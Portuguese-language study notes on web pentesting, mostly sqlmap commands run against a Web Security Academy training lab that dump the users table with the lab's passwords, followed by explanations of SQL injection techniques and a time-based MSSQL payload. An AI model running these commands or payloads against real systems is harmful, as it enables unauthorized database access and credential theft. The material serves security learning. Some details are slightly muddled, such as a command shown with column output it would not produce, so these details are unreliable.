
BurpSuite -> ferramenta braba dms -> captura os pacotes, cookies entre outros...


realiza o scanner procurando vunerabilidades...
https://wapiti-scanner.github.io/
wapiti -u <URL>



sqlmap

sqlmap -u <URL> 


# sqlmap -u <URL> --dbs -> procura por databases

[11:43:58] [INFO] fetching database (schema) names
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public


# sqlmap -u https://0a15004b038766b682a2337c004f00c7.web-security-academy.net/filter?category=Gifts -D public --tables -> procura as tabelas que estao no schema public

+----------+
| products |
| users    |
+----------+


# sqlmap -u https://0a15004b038766b682a2337c004f00c7.web-security-academy.net/filter?category=Gifts -D public --tables

+----------+---------+
| Column   | Type    |
+----------+---------+
| email    | varchar |
| password | varchar |
| username | varchar |
+----------+---------+

# sqlmap -u https://0a15004b038766b682a2337c004f00c7.web-security-academy.net/filter?category=Gifts -D public -T users --colunms "password,username,email" --dump

+-------+----------------------+---------------+
| email | password             | username      |
+-------+----------------------+---------------+
| NULL  | n62xv68urqm195xp23rq | administrator |
| NULL  | 0fhdg4pwyg0xoq9n1ub7 | wiener        |
| NULL  | i327guidgi0pnj98d5f0 | carlos        |
+-------+----------------------+---------------+


Existem algumas técnicas diferentes de exploração de SQL Injection, sendo elas:

Error based injection - Injeção baseada em erro
Essa técnica é conhecida por forçar o banco de dados a gerar mensagens de erro para que, por meio disso, possamos obter informações.

Seu parâmetro no sqlmap: E

Time-based - Baseada no tempo
É um tipo de técnica classificada como “Blind Query”, que significa que o usuário faz a consulta sem ver informações ou erros do banco de dados na página da aplicação. Nesse caso, ele apenas analisa o tempo de resposta do banco para fazer o ataque. Ou seja, o ataque depende de um tempo especificado para o banco de dados retornar resultados, indicando se a execução foi bem-sucedida ou não na consulta SQL. Por exemplo:

Se a primeira letra do nome do primeiro campo do banco de dados for 'A', aguarde 10 segundos. Se a primeira letra do nome do primeiro campo do banco de dados for 'B', aguarde 10 segundos, etc.

Caso for Microsoft SQL Server:

http://www.example.com/example.php?id=A' waitfor delay '00:00:10'--

Seu parâmetro no sqlmap: T

Stacked queries - Consultas empilhadas
Injeção que é capaz de modificar dados além de encerrar uma consulta atual, adicionando uma nova.

Seu parâmetro no sqlmap: S

Boolean based injection - injeção baseada em booleano
Também é uma técnica do tipo injeção cega, em que o usuário usa condições booleanas para verificar se são verdadeiras ou falsas e, com isso, obter informações do banco de dados.

Seu parâmetro no sqlmap: B

Union-query based - Baseada no UNION
Situação vista na aula anterior, em que é possível unir dois SELECTs que possibilitam fazer duas consultas.

Seu parâmetro no sqlmap: U

Command injection - injeção de comando
Ocorre quando a aplicação é vulnerável a funções que proporcionam para o invasor acesso ao shell, onde ele pode inserir linhas de comando.

Seu parâmetro no sqlmap: Q

 

Portanto, existem diversas formas de explorar a vulnerabilidade de SQL Injection e todas elas podem ser automatizadas pelo Sqlmap. Caso você queira explorar apenas algumas, é importante sinalizar por meio de uma flag na sua linha de comando, pois assim você melhora a performance da ferramenta e evita dela ficar testando outras técnicas que não são de seu interesse. Para isso, você pode informar dessa forma: --technique <parâmetros>.

Exemplo: caso eu queria explorar Sql Injection baseado em tempo e no comando UNION:

sqlmap -u <url> --technique TU